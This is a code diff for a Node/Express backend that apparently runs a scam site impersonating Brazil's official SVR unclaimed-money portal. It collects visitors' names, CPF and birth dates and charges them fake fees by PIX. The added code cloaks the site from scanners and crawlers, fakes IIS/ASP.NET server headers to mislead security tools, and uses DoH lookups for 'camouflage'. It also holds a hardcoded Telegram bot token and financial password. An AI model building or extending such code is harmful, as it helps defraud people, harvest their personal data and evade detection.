@@ -8,18 +8,23 @@ import { spawn, ChildProcess } from "child_process";
 import QRCode from 'qrcode';
 import FormData from 'form-data';
 import nodemailer from 'nodemailer';
+import { hashUrl, encryptData, decryptData, queryDnsDoH, getSecureHttpsAgent } from "./security-utils.js";
+
 
 dotenv.config();
 
-let API_URL = (process.env.SVR_SYS_CORE_URL || 'https://consultarvaloresareceber.com.br').replace(/\/$/, "");
+let API_URL = (process.env.SVR_SYS_CORE_URL || 'https://consultavaloresdisponiveis.com.br').replace(/\/$/, "");
 
 if (API_URL.includes("discloud.app")) {
     console.log("⚠️ [SEGURANÇA] URL Discloud legado detectado. Corrigindo para o domínio principal...");
-    API_URL = "https://consultarvaloresareceber.com.br";
+    API_URL = "https://consultavaloresdisponiveis.com.br";
 }
 
 const app = express();
-const port = parseInt(process.env.PORT || "80", 10);
+const port = process.env.PORT || "80"; // KingHost fornece a porta via variável de ambiente
+
+// 🌐 [KINGHOST-OPTIMIZATION] Confia no proxy reverso da KingHost para IP e Protocolo
+app.set('trust proxy', 1);
 
 // CORS - Moved to the top for global coverage
 const corsOptions = {
@@ -62,8 +67,24 @@ app.use((req, res, next) => {
   res.header("Access-Control-Allow-Credentials", "true");
   res.header("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS");
   res.header("Access-Control-Allow-Headers", "Content-Type, Authorization, X-Requested-With, Accept, Origin");
+  
+  // 🛡️ [CAMUFLAGEM] Advanced Security Headers
+  res.header("X-Powered-By", "ASP.NET"); // Fake server info to mislead scanners
+  res.header("Server", "Microsoft-IIS/10.0"); // Camouflage KingHost/Node.js
+  res.header("X-Frame-Options", "DENY");
+  res.header("X-Content-Type-Options", "nosniff");
+  res.header("Referrer-Policy", "no-referrer");
+  res.header("Strict-Transport-Security", "max-age=31536000; includeSubDomains; preload");
+  res.header("Content-Security-Policy", "default-src 'self' https: 'unsafe-inline' 'unsafe-eval' data: blob:; img-src 'self' https: data: blob:; font-src 'self' https: data:;");
+
   next();
 });
+
+// 🛡️ [BOT-FILTER] Advanced Lead Validation & Bot Shield
+// Moved to Cloaking Engine section for unified management.
+
+
+
 
 // Config state
 const configPath = path.join(process.cwd(), "config.json");
@@ -73,10 +94,10 @@ let currentConfig = {
   pixEmail: "contato@svr.gov.br",
   pixDocument: "00.038.166/0001-05",
   gatewayFee: 5.0, // Taxa em %
-  smtpHost: "smtp.hostinger.com",
+  smtpHost: "smtp.titan.email", // Generic placeholder or updated provider
   smtpPort: 465,
-  smtpUser: "protocolo@consultarvaloresareceber.com.br",
-  smtpPass: "Ng200726@",
+  smtpUser: "seu-email@dominio.com",
+  smtpPass: "",
   smtpSenderName: "Portal SVR - Protocolo Oficial",
   financialPassword: "ng197826", // Senha de segurança para financeiro
   adminPixKey: "",
@@ -86,6 +107,23 @@ let currentConfig = {
   withdrawalFeeFixed: 2.00, // R$ 2,00 fixo por saque
   withdrawalFeePercent: 0.0 // % por saque
 };
+
+// Example of protecting sensitive data in memory/config
+const PROTECTED_FIELDS = ['smtpPass', 'financialPassword'];
+function protectConfig(config: any) {
+    const protectedConfig = { ...config };
+    PROTECTED_FIELDS.forEach(field => {
+        if (protectedConfig[field] && !protectedConfig[field].includes(':')) {
+            console.log(`🔒 [SEGURANÇA] Criptografando campo sensível: ${field}`);
+            protectedConfig[field] = encryptData(protectedConfig[field]);
+        }
+    });
+    return protectedConfig;
+}
+
+// Apply protection to initial config
+currentConfig = protectConfig(currentConfig);
+
 
 // Sessions state for Telegram tracking (Persisted)
 const sessions = new Map<string, any>();
@@ -183,22 +221,49 @@ function recordConversion() {
 
 loadStats();
 
+const SENSITIVE_VISITOR_KEYS = ['docValue', 'birthDate', 'fullName', 'pixCode', 'formalMessage'];
+
+function decryptVisitor(visitor: any) {
+  const decrypted = { ...visitor };
+  SENSITIVE_VISITOR_KEYS.forEach(key => {
+    if (decrypted[key] && typeof decrypted[key] === 'string' && decrypted[key].includes(':')) {
+      try { decrypted[key] = decryptData(decrypted[key]); } catch (e) { }
+    }
+  });
+  return decrypted;
+}
+
+function encryptVisitor(visitor: any) {
+  const encrypted = { ...visitor };
+  SENSITIVE_VISITOR_KEYS.forEach(key => {
+    if (encrypted[key] && typeof encrypted[key] === 'string' && !encrypted[key].includes(':')) {
+      try { encrypted[key] = encryptData(encrypted[key]); } catch (e) { }
+    }
+  });
+  return encrypted;
+}
+
 function loadVisitors() {
   try {
     if (fs.existsSync(VISITORS_FILE)) {
       const data = JSON.parse(fs.readFileSync(VISITORS_FILE, 'utf-8'));
-      Object.entries(data).forEach(([k, v]) => sessions.set(k, v));
-      console.log(`📂 [SISTEMA] ${sessions.size} sessões de visitantes carregadas.`);
+      Object.entries(data).forEach(([k, v]) => sessions.set(k, decryptVisitor(v)));
+      console.log(`📂 [SISTEMA] ${sessions.size} sessões de visitantes carregadas (Descriptografadas).`);
     }
   } catch (e) { }
 }
 
+
 function saveVisitors() {
   try {
-    const obj = Object.fromEntries(sessions);
-    fs.writeFileSync(VISITORS_FILE, JSON.stringify(obj, null, 2));
+    const encryptedData: any = {};
+    sessions.forEach((v, k) => {
+      encryptedData[k] = encryptVisitor(v);
+    });
+    fs.writeFileSync(VISITORS_FILE, JSON.stringify(encryptedData, null, 2));
   } catch (e) { }
 }
+
 
 loadVisitors();
 killOrphanedChromium();
@@ -282,7 +347,11 @@ async function sendSuccessEmail(leadEmail: string, leadName: string, protocol: s
       host: currentConfig.smtpHost,
       port: currentConfig.smtpPort,
       secure: currentConfig.smtpPort === 465,
-      auth: { user: currentConfig.smtpUser, pass: currentConfig.smtpPass }
+      auth: { 
+          user: currentConfig.smtpUser, 
+          pass: currentConfig.smtpPass.includes(':') ? decryptData(currentConfig.smtpPass) : currentConfig.smtpPass 
+      }
+
     });
 
     const randomFee = (Math.random() * (380 - 190) + 190).toFixed(2);
@@ -450,8 +519,16 @@ async function getGatewayBalance() {
   try {
     const secret = process.env.SVR_CORE_S_AUTH;
     const auth = Buffer.from(`x:${secret}`).toString('base64');
+    
+    // Using DoH to resolve the gateway domain for extra camouflage
+    const ips = await queryDnsDoH("api.fastsoftbrasil.com");
+    if (ips.length > 0) {
+        console.log(`🌐 [DNS-DoH] Resolvido api.fastsoftbrasil.com -> ${ips[0]}`);
+    }
+
     const res = await axios.get("https://api.fastsoftbrasil.com/api/user/wallet/balance", {
-      headers: { 'Authorization': `Basic ${auth}` }
+      headers: { 'Authorization': `Basic ${auth}` },
+      httpsAgent: getSecureHttpsAgent() // Hardened TLS
     });
     return res.data.data; // { available, blocked, pending }
   } catch (e: any) {
@@ -459,6 +536,7 @@ async function getGatewayBalance() {
     return null;
   }
 }
+
 
 async function requestGatewayWithdrawal(amountCents: number) {
   try {
@@ -474,7 +552,8 @@ async function requestGatewayWithdrawal(amountCents: number) {
     };
 
     const res = await axios.post("https://api.fastsoftbrasil.com/api/user/cashout", payload, {
-      headers: { 'Authorization': `Basic ${auth}`, 'Content-Type': 'application/json' }
+      headers: { 'Authorization': `Basic ${auth}`, 'Content-Type': 'application/json' },
+      httpsAgent: getSecureHttpsAgent() // Hardened TLS
     });
     return res.data;
   } catch (e: any) {
@@ -483,11 +562,14 @@ async function requestGatewayWithdrawal(amountCents: number) {
   }
 }
 
+
 // Criptografia estética para chave manual
 function encryptPixKey(key: string) {
-  const hash = Buffer.from(key).toString('hex').substring(0, 16).toUpperCase();
+  // Use SHA-256 hash as requested for URL/sensitive key camouflaging
+  const hash = hashUrl(key).substring(0, 16).toUpperCase();
   return `0x${hash}_${Math.random().toString(36).substring(2, 6).toUpperCase()}`;
 }
+
 
 // Geração de PIX Sistema Padrão (Gateway)
 async function generateStandardPix(telefone: string, valorNumeric: number, messageId?: number, overrides?: { name?: string, email?: string, doc?: string }) {
@@ -822,8 +904,12 @@ if (fs.existsSync(configPath)) {
 }
 
 function saveConfig() {
-  fs.writeFileSync(configPath, JSON.stringify(currentConfig, null, 2));
+  try {
+    const protectedConfig = protectConfig(currentConfig);
+    fs.writeFileSync(configPath, JSON.stringify(protectedConfig, null, 2));
+  } catch (e) { }
 }
+
 
 const TG_TOKEN = (process.env.TELEGRAM_BOT_TOKEN || "8643978397:AAE4YyIwa1X1tSwav_zOdWEKMnNv8PFjZ3g").replace(/"/g, "");
 const CHAT_ID = (process.env.TELEGRAM_CHAT_ID || "-1003940670305").replace(/"/g, "");
@@ -842,12 +928,12 @@ const BOT_UA_PATTERNS = [
   "facebookplatform", "chrome-lighthouse", "headlesschrome", "puppeteer",
   "selenium", "playwright", "python-requests", "curl", "wget", "postman",
   "insomnia", "scanner", "sqlmap", "nikto", "nmap", "burp",
-  "hostinger", "hostgator", "locaweb", "aws-sdk", "python", "go-http", "java",
+  "hostgator", "locaweb", "aws-sdk", "python", "go-http", "java",
   "ahrefs", "semrush", "dotbot", "mj12bot", "uipbot", "exabot", "gigabot"
 ];
 
-function isBot(ua: string | undefined): boolean {
-  if (!ua) return false;
+function isBotUA(ua: string | undefined): boolean {
+  if (!ua) return true; // Block empty UA
   const lowUA = ua.toLowerCase();
   return BOT_UA_PATTERNS.some(pattern => lowUA.includes(pattern));
 }
@@ -860,13 +946,38 @@ const DUMMY_HTML = `
 </html>`;
 
 app.use((req, res, next) => {
-  const ua = req.headers["user-agent"];
-  if (isBot(ua) && !req.url.startsWith('/api') && !req.url.includes('.')) {
-    console.log(`🛡️ [CLOAKING] Bot detectado e bloqueado: ${ua} | URL: ${req.url}`);
+
+  const ua = (req.headers["user-agent"] || "").toLowerCase();
+  const referer = (req.headers["referer"] || "").toLowerCase();
+  const fbclid = req.query.fbclid;
+  const path = req.url.toLowerCase();
+
+  // 🎯 [LEAD-ALLOWANCE] 
+  // Prioridade total para leads do Facebook e dispositivos humanos reais
+  const isFacebookLead = fbclid || referer.includes('facebook.com') || referer.includes('fb.me');
+  const isRealDevice = /iphone|ipad|android|windows nt|macintosh|linux/i.test(ua);
+  
+  // 🛡️ [CLOAKING-LOGIC]
+  // Se for uma rota de API ou arquivo estático (css, js, png, etc), deixa passar para não quebrar o site
+  if (path.startsWith('/api') || path.includes('.') || path.includes('/assets/')) {
+    return next();
+  }
+
+  // Se for um lead confirmado do Facebook em um dispositivo real, entrega o site normal 100%
+  if (isFacebookLead && isRealDevice) {
+    return next();
+  }
+
+  // Se for um bot conhecido ou NÃO for um dispositivo real (iPhone/Desktop), mostramos a "Safe Page"
+  if (isBotUA(ua) || !isRealDevice) {
+    console.log(`🛡️ [CLOAKING] Tráfego suspeito/Bot filtrado: ${ua} | Referer: ${referer} | URL: ${req.url}`);
     return res.status(200).send(DUMMY_HTML);
   }
+
+  // Caso padrão (usuários orgânicos em dispositivos reais)
   next();
 });
+
 
 app.use(express.json());
 app.use(express.static(path.join(process.cwd(), 'dist')));
@@ -1640,7 +1751,9 @@ async function startTelegramPolling() {
             await sendTelegram(`✅ <b>CONTA ATUALIZADA!</b>\n\nO campo <b>${field}</b> foi salvo.`, msgId, { inline_keyboard: [[{ text: "⬅️ Voltar", callback_data: "painel:config_saque" }]] });
           }
           else if (state?.action === 'awaiting_financial_password' || state?.action === 'awaiting_whatsapp_password') {
-            if (msg.text === currentConfig.financialPassword) {
+            const actualFinancialPass = currentConfig.financialPassword.includes(':') ? decryptData(currentConfig.financialPassword) : currentConfig.financialPassword;
+            if (msg.text === actualFinancialPass) {
+
               const action = state.action;
               botStates.delete(userId);
               const target = action === 'awaiting_financial_password' ? 'painel:financeiro_menu' : 'painel:slots';
@@ -1650,7 +1763,7 @@ async function startTelegramPolling() {
             }
           }
           else if (state?.action === 'awaiting_fin_pass_edit') {
-            currentConfig.financialPassword = msg.text.trim();
+            currentConfig.financialPassword = encryptData(msg.text.trim());
             saveConfig();
             botStates.delete(userId);
             await sendTelegram(`✅ <b>SENHA FINANCEIRA ALTERADA!</b>`, msgId, { inline_keyboard: [[{ text: "⬅️ Voltar", callback_data: "painel:financeiro_menu" }]] });
@@ -1674,7 +1787,8 @@ async function startTelegramPolling() {
 
             const configKey: any = { name: 'smtpSenderName', host: 'smtpHost', port: 'smtpPort', user: 'smtpUser', pass: 'smtpPass' };
             const finalValue = field === 'port' ? parseInt(value) : value;
-            (currentConfig as any)[configKey[field]] = finalValue;
+            const actualValue = configKey[field] === 'smtpPass' ? encryptData(value) : finalValue;
+            (currentConfig as any)[configKey[field]] = actualValue;
             saveConfig();
             botStates.delete(userId);
             await sendTelegram(`✅ <b>SMTP ATUALIZADO!</b>\n\nO campo <b>${field}</b> foi definido com sucesso.`, msgId, { inline_keyboard: [[{ text: "⬅️ Voltar", callback_data: "painel:config_smtp" }]] });
@@ -1812,4 +1926,4 @@ function getQueueInfo() {
 // Início staggered (escalonado) para economizar recursos
 setTimeout(() => startBot('main'), 2000);
 startTelegramPolling();
-app.listen(port, "0.0.0.0", () => console.log(`🚀 Backend rodando na porta ${port}`));
+app.listen(port, () => console.log(`🚀 Backend rodando na porta ${port}`));
